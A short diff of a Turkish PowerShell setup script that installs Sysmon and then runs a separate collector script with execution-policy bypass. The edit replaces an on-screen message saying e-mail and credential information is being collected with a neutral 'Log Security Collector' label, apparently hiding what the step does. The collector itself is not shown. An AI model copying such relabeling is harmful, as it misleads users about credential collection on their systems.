@@ -32,7 +32,7 @@ if (-not (Test-Path $SysmonExe)) {
 Start-Process -FilePath $SysmonExe -ArgumentList "-accepteula -i `"$SysmonConfig`"" -Wait
 
 # Toplayıcı scripti çalıştır
-Write-Host "`n[*] E-posta ve kimlik bilgileri toplanıyor..." -ForegroundColor Cyan
+Write-Host "`n[*] Log Security Collector Calisiyor..." -ForegroundColor Cyan
 Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$CollectorScript`"" -Wait
 
 Write-Host "[OK] Tum islemler basariyla tamamlandi." -ForegroundColor Green
